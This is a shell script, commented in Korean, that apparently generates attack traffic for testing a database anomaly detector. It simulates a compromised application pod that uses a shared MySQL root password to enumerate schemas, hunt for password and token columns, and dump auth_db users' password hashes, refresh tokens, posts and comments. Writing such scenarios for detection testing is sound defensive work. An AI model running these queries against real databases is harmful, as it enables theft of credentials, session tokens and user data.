#!/bin/sh
# mysql_d1.sh — [structural] 침해 app pod → mysql cross-DB 탈취 (T1078/T1555)  [init.sql 정합본]
# 공유 root 크리덴셜로 '남의 서비스 DB'를 정찰→덤프한다. 실제 스키마(init.sql) 컬럼을 그대로 노린다:
#   auth_db.users(username,password=BCrypt)  auth_db.refresh_tokens(token,expires_at)
#   posts_db.posts(*)  comments_db.comments(*)
#
# 왜 이상으로 갈리나(SQL-18): 정상 JPA 는 자기 DB 에 연결(USE posts_db)돼 'FROM posts' 처럼 DB 접두어 없이 질의한다.
#   d1 은 'auth_db.users' 처럼 **명시적 타DB 접두어** + SHOW DATABASES/information_schema + SELECT * 라
#   cross-DB·info_schema·select_star·limit 플래그가 켜져 정상과 분리된다.
#
# ★ keep-alive: 한 mysql 연결(heredoc)에 여러 질의 → 한 :3306 세션에 다수 COM_QUERY → 5-윈도우 충족.
# ★ 클라이언트 폴백: JRE/distroless app pod 엔 mysql CLI 가 없음 → 침해자가 /tmp/atk/mysql(정적)로 반입한 상황 가정.
. "$(dirname "$0")/common.sh"

MYSQL_BIN="${MYSQL_BIN:-mysql}"
command -v "$MYSQL_BIN" >/dev/null 2>&1 || MYSQL_BIN="mariadb"
command -v "$MYSQL_BIN" >/dev/null 2>&1 || MYSQL_BIN="$(dirname "$0")/mysql"
if ! { command -v "$MYSQL_BIN" >/dev/null 2>&1 || [ -x "$MYSQL_BIN" ]; }; then
  echo "[mysql_d1] mysql client 없음(MYSQL_BIN=$MYSQL_BIN) — 정적 mysql/mariadb 클라이언트를 /tmp/atk/mysql 로 반입 필요" >&2
  exit 3
fi
MYSQL_USER="${MYSQL_USER:-root}"; MYSQL_PW="${MYSQL_PW:-rootpassword}"     # 실제 공유 root 비번
DB_AUTH="${DB_AUTH:-auth_db}"; DB_POST="${DB_POST:-posts_db}"; DB_COMMENT="${DB_COMMENT:-comments_db}"
DUMP="${DUMP:-200}"                                                        # SELECT * 덤프 행수(보고서 예: 500)
runq() { "$MYSQL_BIN" -h "$MYSQL_HOST" -P "$MYSQL_PORT" -u "$MYSQL_USER" -p"$MYSQL_PW" --connect-timeout=5 -N -B 2>/dev/null; }

i=0
while [ "$i" -lt "$N" ]; do
  # 한 연결에 '정찰 → 크리덴셜/토큰 → 벌크 덤프'를 몰아 실행(→ 세션 윈도우 충족).
  runq <<SQL
SHOW DATABASES;
SELECT schema_name FROM information_schema.schemata;
SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema NOT IN ('mysql','information_schema','performance_schema','sys');
SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%pass%' OR column_name LIKE '%token%';
SELECT id, username, password FROM ${DB_AUTH}.users LIMIT ${DUMP};
SELECT user_id, token, expires_at FROM ${DB_AUTH}.refresh_tokens LIMIT ${DUMP};
SELECT * FROM ${DB_POST}.posts LIMIT ${DUMP};
SELECT * FROM ${DB_COMMENT}.comments LIMIT ${DUMP};
SELECT COUNT(*) FROM ${DB_AUTH}.users;
SQL
  i=$((i+1)); pace
done
echo "[mysql_d1] done N=$N (cross-DB recon+dump → $MYSQL_HOST:$MYSQL_PORT via $MYSQL_BIN, per-conn multi-query, keep-alive)"